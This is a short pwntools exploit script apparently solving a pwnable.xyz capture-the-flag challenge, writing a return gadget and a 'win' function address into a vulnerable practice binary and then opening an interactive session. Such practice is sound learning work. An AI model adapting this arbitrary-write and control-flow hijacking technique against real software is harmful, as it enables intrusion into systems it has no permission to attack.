from pwn import *

exe = ELF("./challenge", checksec=True)

context.binary = exe

HOST = "svc.pwnable.xyz"
PORT = 30002

gdbscript = """
set follow-fork-mode child
"""

args.LOCAL = True
args.DEBUG = True

def conn():
    if args.LOCAL:
        r = process(exe.path)
        if args.DEBUG:
            gdb.attach(r, gdbscript=gdbscript)
    else:
        r = remote(HOST, PORT)

    return r

def main():
    r  = conn()

    rop = ROP(exe)

    r.sendlineafter(b"Input: ", f"{rop.ret.address} 0 13".encode())
    r.sendlineafter(b"Input: ", f"{exe.symbols.win} 0 14".encode())
    r.sendlineafter(b"Input: ", b"palle")
    
    r.interactive()

if __name__ == "__main__":
    main()
